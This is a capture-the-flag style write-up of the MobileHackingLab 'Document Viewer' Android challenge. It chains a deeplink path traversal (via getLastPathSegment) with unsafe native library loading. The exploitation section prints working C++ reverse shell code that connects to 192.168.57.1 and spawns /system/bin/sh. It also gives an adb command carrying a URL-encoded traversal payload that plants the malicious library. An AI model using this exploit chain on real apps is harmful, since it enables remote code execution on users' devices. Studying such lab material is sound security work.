Title: MobileHackingLab - Document Viewer
Slug: mobile/mobilehackinglab/document-viewer
Date: 2024-07-05 18:00
Category: Mobile


## Static Analysis

After decompiling the DocumentViewer APK, I've noticed that in the `com.mobilehackinglab.documentviewer.MainActivity` there's a dynamic native library loading; if a `libdocviewer_pro.so` is present at `getApplicationContext().getFilesDir() + "native-libraries" + architecture`, it will be loaded and the flag `proFeaturesEnabled` set to true.

![[unsafe-dynamic-code-loading.png]]

When `proFeaturesEnabled` is set to true, the native `initProFeatures()` is invoked.

![[dynamic-code-execution.png]]

Analyzing the manifest, I noticed that the `MainActivity` has some interesting intent filters:

![[main-activity-deeplink.png]]

Analyzing the `MainActivity` code, it seems that a user can provide a PDF to be opened with the DocumentViewer app via deeplink, which intent is handled by the  `handleIntent()` method. The deeplink allows to fetch PDF from a remote source via http/https protocol.
The provided PDF will be processed by the `com.mobilehackinglab.documentviewer.CopyUtil` class:

![[copy-util.png]]

The `CopyUtil`'s class member `Companion` does not perform any validation or sanitization on the input URI; moreover, it uses the unsafe `getLastPathSegment()` function to get last URI segment (line 50) in order to use it as filename for the output file (line 55):

![[unsafe-uri-usage.png]]

An attacker could exploit this usage of untrusted input in order to achieve a Path Traversal attack.


## Exploitation

The exploitation strategy will be the following:

1. Generate a fake `libdocviewer_pro.so`, containing a reverse shell code.
2. Exploit the path traversal vulnerability to copy the forged `libdocviewer_pro.so` to the `getApplicationContext().getFilesDir() + "native-libraries" + architecture` directory that will result in  the following path `/data/user/0/com.mobilehackinglab.documentviewer/files/native-libraries/x84_64`
3. Reload the app so that the `libdocviewer_pro.so` gets loaded and its code ran.

In order to complete the step 1, the following native android lib code is compiled:

~~~c
#include <jni.h>  
#include <string>  
#include <cstdio>  
#include <cstdlib>  
#include <unistd.h>  
  
#include <sys/socket.h>  
#include <arpa/inet.h>  
#include <netinet/in.h>  
#include <sys/types.h>  
  
// remote host to "send" shell  
#define REMOTE_HOST "192.168.57.1"  
#define REMOTE_PORT 8090  
  
extern "C" JNIEXPORT void JNICALL  
Java_com_mobilehackinglab_documentviewer_MainActivity_initProFeatures(  
        JNIEnv* env,  
        jobject /* this */) {  
}  
  
void __attribute__ ((constructor)) reverse_shell() {  
    // create child process with fork  
    if (fork() == 0) {  
        int rsSocket;  
  
        struct sockaddr_in socketAddr{};  
  
        // configure socket address  
        socketAddr.sin_family = AF_INET;  
        socketAddr.sin_addr.s_addr = inet_addr(REMOTE_HOST);  
        socketAddr.sin_port = htons(REMOTE_PORT);  
  
        // create socket connection  
        rsSocket = socket(AF_INET, SOCK_STREAM, 0);  
        connect(rsSocket, (struct sockaddr *) &socketAddr, sizeof(socketAddr));  
  
        // redirect std to socket  
        dup2(rsSocket, 0); // stdin  
        dup2(rsSocket, 1); // stdout  
        dup2(rsSocket, 2); // stderr  
  
        // get shell        
        execve("/system/bin/sh", nullptr, nullptr);  
    }  
}
~~~

In this code, the `initProFeatures` does nothing whilst the `reverse_shell` function gets executed the moment the library is loaded by the application.
 step 

To exploit the path traversal vulnerability (step 2), a web server is configured to run within the following directory tree:

![[webserver-directories-tree.png]]

Then, performing an http request to the webserver as follows:
`http://192.168.57.1:8000/storage/emulated/0/Download/..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so`

Will result in:

- the URL-encoded `/` char in `%2F` is correctly interpreted by the web server, so the  `libdocviewer_pro.so` is correctly returned.
-  the `getLastPathSegment()` function will return as last segment the value `..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so`.
- The `CopyUtil`'s `copyFileFromUri` will download the evil library and move it to the directory where it's expected to be the legit library

This is done by running:

~~~shell
adb shell am start -a 'android.intent.action.VIEW' -n 'com.mobilehackinglab.documentviewer/.MainActivity' -d 'http://192.168.57.1:8000/storage/emulated/0/Download/..%2F..%2F..%2F..%2Fdata%2Fuser%2F0%2Fcom.mobilehackinglab.documentviewer%2Ffiles%2Fnative-libraries%2Fx86_64%2Flibdocviewer_pro.so'
~~~

![[path-traversal-exploitation.png]]

For the last step (3), it's enough to setup a reverse shell listener and simply re-open the application:

![[rce-reverse-shell.png]]